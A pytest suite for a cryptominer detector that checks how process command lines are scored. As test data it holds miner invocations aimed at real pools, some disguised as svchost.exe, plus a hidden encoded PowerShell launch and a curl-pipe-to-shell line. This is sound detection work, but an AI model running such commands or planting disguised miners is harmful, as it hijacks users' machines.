"""Group 2: the command-line signal.

A miner can rename its binary and strip its strings, but it still has to be told
where to send the money. These tests pin both halves of that: the miner-specific
indicators convict, and the generic flags every CLI uses never can.
"""

import time
from contextlib import nullcontext
from types import SimpleNamespace

import psutil
import pytest

from minersentry import cmdline
from minersentry import engine as engine_module
from minersentry.config import Config
from minersentry.engine import Engine
from minersentry.scoring import Signal, combine, score_cmdline, score_cpu

CFG = Config()
WALLET = "4" + "9" * 94          # Monero-shaped, not a real address
NCPU = 20


def score(argv, cfg=CFG):
    return cmdline.score_of(cmdline.indicators(argv, cfg), cfg.cmdline_generic_cap)


def sig(argv, cfg=CFG):
    hits = cmdline.indicators(argv, cfg)
    return score_cmdline(cmdline.score_of(hits, cfg.cmdline_generic_cap),
                         cmdline.labels(hits), cfg)


def specific(argv, cfg=CFG):
    return any(h.specific for h in cmdline.indicators(argv, cfg))


# -- miner-specific indicators ---------------------------------------------
@pytest.mark.parametrize("argv", [
    ["xmrig", "-o", "pool.supportxmr.com:3333", "-u", WALLET, "-p", "x"],
    ["svchost.exe", "--url=pool.hashvault.pro:3333", "--user=" + WALLET, "--donate-level=1"],
    ["x", "-a", "rx/0", "-o", "rx.unmineable.com:3333", "-u", "DOGE:DH5yaieqoZN36fDVciNyRueRGvGLR3mr7L.r1"],
    ["t-rex", "-a", "kawpow", "-o", "stratum+tcp://rvn.2miners.com:6060", "-u", "Rabc"],
    ["w.exe", "--randomx-1gb-pages", "--cpu-max-threads-hint=50", "-o", "1.2.3.4:3333"],
    ["m", "-o", "203.0.113.9:443", "-u", WALLET, "--tls"],      # private proxy, no pool host
])
def test_real_miner_invocations_are_specific_and_strong(argv):
    assert specific(argv)
    assert score(argv) >= CFG.hard_cmdline


def test_stratum_url_is_reported_with_its_endpoint():
    hits = cmdline.indicators(["m", "-o", "stratum+tcp://pool.example.net:3333"], CFG)
    assert any("pool.example.net:3333" in h.label and h.specific for h in hits)


def test_miner_flag_is_not_mistaken_for_a_pool_host():
    # "randomx" is a pool-hostname keyword; the flag must not be labeled a host
    hits = cmdline.indicators(["w.exe", "--randomx-1gb-pages"], CFG)
    assert hits and not any("pool in arguments" in h.label for h in hits)
    assert any("miner-only flag" in h.label for h in hits)


def test_algorithm_only_counts_as_a_flag_value_or_slashed_token():
    assert specific(["m", "--algo", "randomx"])
    assert specific(["m", "rx/0"])
    # a bare English word must not match just because an algo shares the name
    assert not specific(["editor", "notes-about-scrypt.txt"])


# -- generic indicators can never convict ----------------------------------
@pytest.mark.parametrize("argv", [
    ["curl", "-u", "user:pass", "-o", "out.json", "--url", "https://api.example.com"],
    ["ffmpeg", "-i", "in.mp4", "-t", "30", "-o", "out.mp4"],
    ["pip", "install", "-U", "-t", "./lib", "requests"],
    ["docker", "run", "-p", "8080:80", "-u", "1000", "nginx"],
    ["ssh", "-p", "2222", "-u", "root", "host.example.com"],
    ["powershell", "-w", "hidden", "-enc", "SQBFAFgA"],          # suspicious, not mining
    ["sh", "-c", "curl https://x.example/i.sh | sh"],
    ["app", "--config=/tmp/app.json"],
])
def test_generic_arguments_stay_under_the_cap(argv):
    assert not specific(argv)
    assert score(argv) <= CFG.cmdline_generic_cap < CFG.hard_cmdline


def test_generic_arguments_cannot_convict_even_at_full_core():
    cpu = score_cpu([95.0] * 8, NCPU, CFG)
    for argv in (["curl", "-u", "a:b", "-o", "f", "--url", "https://x.example"],
                 ["powershell", "-w", "hidden", "-enc", "SQBF"]):
        assert combine([cpu, sig(argv)], CFG)[1] == "Clean"


def test_empty_and_huge_command_lines_are_safe():
    assert cmdline.indicators([], CFG) == []
    assert cmdline.indicators("", CFG) == []
    assert cmdline.indicators(None, CFG) == []
    huge = ["java", "-cp", "x.jar:" * 50000, "-o", "pool.supportxmr.com:3333"]
    cmdline.indicators(huge, CFG)        # bounded by MAX_CHARS, must not hang


# -- privacy ----------------------------------------------------------------
def test_wallet_and_password_never_appear_in_retained_labels():
    argv = ["m", "-o", "pool.supportxmr.com:3333", "-u", WALLET, "-p", "s3cr3t-rig-pass",
            "--api-worker-id", "my-pc-name"]
    hits = cmdline.indicators(argv, CFG)
    blob = " ".join(h.label for h in hits)
    assert WALLET not in blob and WALLET[:24] not in blob
    assert "s3cr3t" not in blob and "my-pc-name" not in blob
    assert any("wallet address" in h.label for h in hits)   # presence still reported


# -- scoring integration ----------------------------------------------------
def test_mining_args_plus_modest_cpu_convicts():
    # the hole this closes: 44% of one core used to be Clean even with strings
    argv = ["svchost.exe", "-o", "pool.supportxmr.com:3333", "-u", WALLET]
    for lvl in (44.0, 46.0, 95.0):
        cpu = score_cpu([lvl] * 8, NCPU, CFG)
        assert combine([cpu, sig(argv)], CFG)[1] == "Likely Miner", lvl


def test_mining_args_on_a_trusted_interpreter_still_convict():
    # a miner written in JS/Python: memory is dampened, arguments are not
    argv = ["node.exe", "-o", "pool.supportxmr.com:3333", "-u", WALLET]
    signals = [score_cpu([95.0] * 8, NCPU, CFG), Signal("memory", 20, "dampened"), sig(argv)]
    assert combine(signals, CFG)[1] == "Likely Miner"


def test_idle_configured_miner_surfaces_on_desktop_only():
    argv = ["m", "-o", "pool.supportxmr.com:3333", "-u", WALLET]
    assert combine([sig(argv)], Config())[1] == "Suspicious"
    cloud = Config(profile="cloud")
    assert combine([sig(argv, cloud)], cloud)[1] == "Clean"


def test_cmdline_signal_is_outside_the_weighted_blend():
    # adding it must not shift existing scores; it convicts via its own rules
    assert "cmdline" not in CFG.weights


def test_no_indicators_is_a_zero_signal():
    s = sig(["notepad.exe", "notes.txt"])
    assert s.score == 0 and "no mining indicators" in s.detail


# -- engine integration -----------------------------------------------------
def _fake(pid, name, exe, argv, cpu=98.0):
    mem = SimpleNamespace(rss=0)
    return SimpleNamespace(
        pid=pid, info={"pid": pid, "name": name, "cpu_percent": cpu,
                       "memory_info": mem, "create_time": 1.0},
        name=lambda: name, exe=lambda: exe, username=lambda: "", oneshot=nullcontext,
        memory_info=lambda: mem, num_threads=lambda: 2, cpu_percent=lambda *_: cpu,
        cmdline=lambda: argv)


def _engine(tmp_path, procs):
    from minersentry.audit import AuditLog
    import pytest as _pytest
    mp = _pytest.MonkeyPatch()
    mp.setattr(engine_module.psutil, "process_iter", lambda *a, **k: iter(procs))
    mp.setattr(engine_module.psutil, "net_connections", lambda **k: [])
    mp.setattr(engine_module.psutil, "cpu_percent", lambda *a: 10.0)
    e = Engine(cfg=Config(pool_intel_enabled=False),
               audit=AuditLog(path=str(tmp_path / "a.log")))
    return e, mp


def test_engine_reads_arguments_once_and_convicts(tmp_path):
    argv = ["svchost.exe", "-o", "pool.supportxmr.com:3333", "-u", WALLET]
    reads = []
    proc = _fake(6101, "svchost.exe", r"C:\Windows\System32\svchost.exe", argv)
    proc.cmdline = lambda: (reads.append(1), argv)[1]
    e, mp = _engine(tmp_path, [proc])
    try:
        for _ in range(6):
            results = e.scan_once()
    finally:
        mp.undo()
    r = next(x for x in results if x.pid == 6101)
    assert r.verdict == "Likely Miner"
    assert next(s.score for s in r.signals if s.name == "cmdline") >= CFG.hard_cmdline
    assert len(reads) == 1          # arguments are fixed per PID: read once


def test_engine_tolerates_unreadable_arguments(tmp_path):
    def boom():
        raise psutil.AccessDenied(6102)
    proc = _fake(6102, "x.exe", r"C:\x.exe", [])
    proc.cmdline = boom
    e, mp = _engine(tmp_path, [proc])
    try:
        results = e.scan_once()
    finally:
        mp.undo()
    assert any(r.pid == 6102 for r in results)      # scan continues
    assert e._cmd_hits.get(6102) == []


def test_reused_pid_drops_cached_arguments(tmp_path):
    argv = ["m", "-o", "pool.supportxmr.com:3333", "-u", WALLET]
    procs = [_fake(6103, "m.exe", r"C:\m.exe", argv)]
    e, mp = _engine(tmp_path, procs)
    try:
        e.scan_once()
        assert e._cmd_hits[6103]
        procs[0] = _fake(6103, "benign.exe", r"C:\benign.exe", ["benign.exe"])
        procs[0].info["create_time"] = 999.0        # same PID, new process
        results = e.scan_once()
    finally:
        mp.undo()
    r = next(x for x in results if x.pid == 6103)
    assert next(s.score for s in r.signals if s.name == "cmdline") == 0


def test_mining_arguments_pull_an_idle_process_into_the_memory_sweep():
    e = Engine(cfg=Config(pool_intel_enabled=False))
    now = time.time()
    for pid in (6201, 6202):                        # busy, unremarkable processes
        for k in range(4):
            e._cpu_hist[pid].append((now - k, 95.0))
    idle = 6301                                     # idle, but configured to mine
    e._cmd_hits[idle] = cmdline.indicators(
        ["w.exe", "-o", "pool.supportxmr.com:3333", "-u", WALLET], e.cfg)
    targets = e.deep_scan_targets()
    assert idle in targets
    assert targets.index(idle) < targets.index(6201)   # scanned before mere load
